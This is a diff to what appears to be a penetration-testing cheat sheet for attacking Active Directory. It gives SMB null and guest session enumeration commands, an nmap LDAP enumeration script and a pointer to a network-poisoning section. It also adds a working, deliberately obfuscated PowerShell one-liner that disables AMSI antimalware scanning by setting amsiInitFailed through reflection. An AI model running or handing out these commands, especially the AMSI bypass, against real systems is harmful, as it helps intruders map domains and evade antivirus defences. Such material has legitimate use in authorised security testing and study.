@@ -8,7 +8,7 @@ Commands mentioned here are a combination of windows system built-in commands an
 
 If you just have access to an AD environment but you don't have any credentials/sessions
 
-### **Check for null and Guest access on smb services**
+### **Check for null and Guest Access on SMB Services**
 
 **for old versions of windows**
 
@@ -20,19 +20,29 @@ smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP
 smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
 ```
 
-### **Enumerate Ldap**
+### **Enumerate LDAP**
 
 ```text
 nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
 ```
 
-### **Poison the network**
+## **Poisoning the Network**
 
 **Assuming that you are conected to the internal network \(part of the domain\) but dont have access to any system in the domain.**
 
-#### **check out MITM Section** 
+#### **check out**[ **MITM**](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/active-directory-attacks/network-poisoning-mitm) **Section.**
 
-\*\*\*\*
+## Bypass AMSI
+
+run this to bypass AMSI in the current powershell terminal that you are using:
+
+```text
+powershell -ep bypass
+
+SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+#### For more info about AMSI refere to the AMSI bypass in AV Evasion.
 
 ## Load scripts in Memory
 
